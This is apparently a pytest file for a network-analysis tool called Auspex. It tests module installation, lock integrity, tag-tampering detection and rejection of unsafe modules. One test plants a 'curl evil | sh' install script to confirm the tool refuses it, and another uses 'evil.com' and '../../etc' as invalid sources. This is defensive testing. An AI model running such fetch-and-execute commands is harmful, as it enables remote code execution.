"""Modules communautaires et commandes plan / apply."""

import importlib.util
import json
import shutil
import subprocess
from pathlib import Path

import pytest
import yaml

from auspex.cli import main
from auspex.modules import ModuleError, parse_source, version_matches

DEMO = Path(__file__).resolve().parent.parent / "examples" / "demo"
GIT = ["git", "-c", "user.name=t", "-c", "user.email=t@example.invalid", "-c", "init.defaultBranch=main"]


def git(repo, *args):
    subprocess.run([*GIT, "-C", str(repo), *args], check=True, capture_output=True)


def make_module(root, name="auspex-rules-test", mtype="rules", spec=">=0.1,<1.0", files=None, tag="v1.0.0"):
    root.mkdir(parents=True, exist_ok=True)
    git(root, "init", "-q")
    manifest = {"name": name, "version": tag.lstrip("v"), "type": mtype, "auspex": spec,
                "license": "Apache-2.0", "description": "Module de test"}
    (root / "module.yaml").write_text(yaml.safe_dump(manifest))
    if files is None:
        files = {"rules/extra.yaml": yaml.safe_dump({"rules": [{
            "id": "mod-dns-resolver", "log": "conn", "target": "resp",
            "match": {"id.resp_p": 53, "service": {"regex": "dns"}},
            "set": {"role": "Résolveur DNS interne (module)"}, "weight": 0.8}]})}
    for rel, content in files.items():
        (root / rel).parent.mkdir(parents=True, exist_ok=True)
        (root / rel).write_text(content)
    git(root, "add", "-A")
    git(root, "commit", "-q", "-m", "init")
    git(root, "tag", tag)
    return f"file://{root}@{tag}"


@pytest.fixture
def site(tmp_path, monkeypatch):
    work = tmp_path / "site"
    shutil.copytree(DEMO, work, ignore=shutil.ignore_patterns("state", "logs"))
    spec = importlib.util.spec_from_file_location("gen", work / "generate_logs.py")
    gen = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(gen)
    gen.generate(work / "logs", days=7)
    monkeypatch.chdir(work)
    return work


def set_modules(site, specs):
    cfg = yaml.safe_load((site / "auspex.yaml").read_text())
    cfg["modules"] = specs
    (site / "auspex.yaml").write_text(yaml.safe_dump(cfg, allow_unicode=True))


def out(capsys):
    return capsys.readouterr()


# --- plan / apply ----------------------------------------------------------------

def test_plan_apply_idempotent(site, capsys):
    assert main(["plan"]) == 0
    o = out(capsys).out
    assert "Règles de flux  : 11 changement(s)" in o and "auspex apply" in o
    assert not (site / "state" / "flow_rules.json").exists()  # le plan n'écrit rien
    assert main(["apply"]) == 0
    assert "✓ Règles de flux" in out(capsys).out
    assert main(["apply"]) == 0
    assert "Rien à faire" in out(capsys).out


def test_apply_refuses_when_plan_has_errors(site, capsys):
    (site / "regles-flux.csv").write_text("id,source,destination,protocole,port\nX,Nulle-part,T0-AD,tcp,88\n")
    assert main(["plan"]) == 1
    assert main(["apply"]) == 1
    o = out(capsys).out
    assert "Rien n'a été appliqué" in o and "Nulle-part" in o
    assert not (site / "state" / "flow_rules.json").exists()


def test_netbox_errors_block_apply(site, capsys, monkeypatch):
    cfg = yaml.safe_load((site / "auspex.yaml").read_text())
    cfg["netbox"] = {"url": "http://127.0.0.1:9", "token_env": "ABSENT_TOKEN"}
    (site / "auspex.yaml").write_text(yaml.safe_dump(cfg, allow_unicode=True))
    monkeypatch.delenv("ABSENT_TOKEN", raising=False)
    assert main(["apply"]) == 1
    assert "ABSENT_TOKEN" in out(capsys).out
    assert not (site / "state" / "flow_rules.json").exists()


# --- modules ------------------------------------------------------------------------

def test_rules_module_installed_and_used(site, tmp_path, capsys):
    spec = make_module(tmp_path / "mod")
    set_modules(site, [spec])
    assert main(["plan"]) == 0
    assert f"+ {spec}" in out(capsys).out
    assert main(["apply"]) == 0
    assert "auspex-rules-test 1.0.0" in out(capsys).out
    lock = json.loads((site / "auspex.lock").read_text())["modules"][spec]
    assert len(lock["commit"]) == 40 and lock["type"] == "rules"

    assert main(["analyze", "--logs", "logs", "--now", "logs", "--no-send"]) == 0
    out(capsys)
    assert main(["assets", "--json"]) == 0
    dc = next(a for a in json.loads(out(capsys).out) if a["ip"] == "10.0.0.5")
    roles = {r["value"]: r["evidence"] for r in dc["identification"]["role"]}
    assert roles["Résolveur DNS interne (module)"] == ["mod-dns-resolver"]

    assert main(["apply"]) == 0
    assert "Rien à faire" in out(capsys).out


def test_moved_tag_is_refused(site, tmp_path, capsys):
    repo = tmp_path / "mod"
    spec = make_module(repo)
    set_modules(site, [spec])
    assert main(["apply"]) == 0
    # Le dépôt est compromis : le même tag pointe vers un autre contenu
    (repo / "rules" / "extra.yaml").write_text("rules: []\n")
    git(repo, "commit", "-q", "-am", "piégé")
    git(repo, "tag", "-f", "v1.0.0")
    shutil.rmtree(site / "state" / "modules")  # force une réinstallation
    out(capsys)
    assert main(["apply"]) == 5
    assert "Possible compromission" in out(capsys).err


def test_tampered_module_on_disk_is_detected(site, tmp_path, capsys):
    spec = make_module(tmp_path / "mod")
    set_modules(site, [spec])
    assert main(["apply"]) == 0
    installed = next((site / "state" / "modules").iterdir())
    (installed / "rules" / "extra.yaml").write_text("rules: []\n")
    out(capsys)
    assert main(["analyze", "--logs", "logs", "--no-send"]) == 5
    assert "modifié sur le disque" in out(capsys).err


def test_code_in_data_module_is_refused(site, tmp_path, capsys):
    spec = make_module(tmp_path / "mod", files={"rules/ok.yaml": "rules: []\n", "install.sh": "curl evil | sh\n"})
    set_modules(site, [spec])
    assert main(["apply"]) == 5
    assert "install.sh" in out(capsys).err
    assert not (site / "state" / "modules").exists() or not any((site / "state" / "modules").iterdir())


def test_future_code_module_types_refused(site, tmp_path, capsys):
    spec = make_module(tmp_path / "mod", mtype="output", files={"README.md": "x"})
    set_modules(site, [spec])
    assert main(["apply"]) == 5
    assert "pas encore pris en charge" in out(capsys).err


def test_incompatible_module_refused(site, tmp_path, capsys):
    spec = make_module(tmp_path / "mod", spec=">=2.0")
    set_modules(site, [spec])
    assert main(["apply"]) == 5
    assert "compatible avec Auspex >=2.0" in out(capsys).err


def test_invalid_rules_in_module_refused(site, tmp_path, capsys):
    spec = make_module(tmp_path / "mod", files={"rules/bad.yaml": "rules:\n  - {id: x, log: conn, set: {couleur: rouge}, weight: 0.5}\n"})
    set_modules(site, [spec])
    assert main(["apply"]) == 5
    assert "attributs inconnus" in out(capsys).err


def test_module_removed_when_dropped_from_config(site, tmp_path, capsys):
    spec = make_module(tmp_path / "mod")
    set_modules(site, [spec])
    assert main(["apply"]) == 0
    set_modules(site, [])
    assert main(["plan"]) == 0
    assert f"- {spec}" in out(capsys).out
    assert main(["apply"]) == 0
    assert list((site / "state" / "modules").iterdir()) == []
    assert json.loads((site / "auspex.lock").read_text())["modules"] == {}


def test_references_module_enriches_findings(site, tmp_path, capsys):
    spec = make_module(tmp_path / "ref", name="auspex-ref-sante", mtype="references", files={
        "references.yaml": yaml.safe_dump({"references": {
            "flux_non_declare_persistant": ["Référentiel HDS, exigence 4.2 (cloisonnement)"]}}, allow_unicode=True)})
    set_modules(site, [spec])
    assert main(["apply"]) == 0
    assert main(["analyze", "--logs", "logs", "--now", "logs", "--no-send"]) == 0
    out(capsys)
    assert main(["findings", "--json"]) == 0
    f = next(x for x in json.loads(out(capsys).out) if x["type"] == "flux_non_declare_persistant")
    assert "Référentiel HDS, exigence 4.2 (cloisonnement)" in f["references"]
    assert any(r.startswith("NIS2") for r in f["references"])  # références d'origine conservées


def test_unknown_finding_type_in_references_refused(site, tmp_path, capsys):
    spec = make_module(tmp_path / "ref", mtype="references",
                       files={"references.yaml": "references:\n  type_invente: [x]\n"})
    set_modules(site, [spec])
    assert main(["apply"]) == 5
    assert "type_invente" in out(capsys).err


# --- utilitaires -------------------------------------------------------------------

def test_version_matching():
    assert version_matches("0.1.0", ">=0.1,<0.2")
    assert not version_matches("0.2.0", ">=0.1,<0.2")
    assert version_matches("1.4.2", ">1.4.1,!=1.5.0")
    with pytest.raises(ModuleError):
        version_matches("0.1.0", "~=0.1")


def test_source_parsing():
    s = parse_source("github.com/exemple/auspex-rules-x@v1.2.0")
    assert s.url == "https://github.com/exemple/auspex-rules-x" and s.ref == "v1.2.0"
    for bad in ("github.com/x/y", "github.com/x/y@../../etc", "ftp://x/y@v1", "evil.com/x/y@v1"):
        with pytest.raises(ModuleError):
            parse_source(bad)


def test_shipped_template_is_a_valid_module(capsys):
    tpl = Path(__file__).resolve().parent.parent / "templates" / "module-rules"
    assert main(["module", "check", str(tpl)]) == 0
    assert "Module valide : auspex-rules-exemple" in out(capsys).out


def test_module_list(site, tmp_path, capsys):
    spec = make_module(tmp_path / "mod")
    set_modules(site, [spec])
    assert main(["apply"]) == 0
    out(capsys)
    assert main(["module", "list"]) == 0
    listing = out(capsys).out
    assert "auspex-rules-test" in listing and "1.0.0" in listing and "intègre" in listing
